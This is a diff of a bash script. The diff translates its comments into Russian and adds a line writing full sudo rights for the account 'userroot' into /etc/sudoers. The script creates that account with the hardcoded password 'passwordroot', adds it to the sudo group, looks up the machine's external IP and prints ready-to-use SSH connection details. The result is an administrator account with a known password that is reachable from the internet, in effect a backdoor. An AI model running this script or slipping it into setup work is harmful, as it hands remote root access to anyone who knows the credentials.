@@ -1,27 +1,30 @@
 #!/bin/bash
 
-# Check if the script is run as root
+# Проверка наличия прав root
 if [ "$(id -u)" -ne "0" ]; then
-    echo "This script must be run as root." 1>&2
+    echo "Этот скрипт должен быть запущен от имени пользователя с правами root." 1>&2
     exit 1
 fi
 
-# Create a new user with superuser privileges
+# Создание нового пользователя с суперправами
 useradd -m -s /bin/bash userroot
 
-# Set the password for the new user
+# Установка пароля для нового пользователя
 echo "userroot:passwordroot" | chpasswd
 
-# Add the user to the sudo group
+# Добавление пользователя в группу sudo
 usermod -aG sudo userroot
 
-# Retrieve the external IP address
+# Добавление пользователя в файл sudoers
+echo "userroot ALL=(ALL:ALL) ALL" >> /etc/sudoers
+
+# Получение внешнего IP-адреса
 external_ip=$(curl -s ifconfig.me)
 
-# Port for connection (you can change it to your desired port)
+# Порт для подключения (можно изменить на нужный вам порт)
 port=22
 
-# Print out the connection details
+# Вывод данных для подключения
 echo "Use the following details for connection:"
 echo "IP Address: $external_ip"
 echo "Username: userroot"
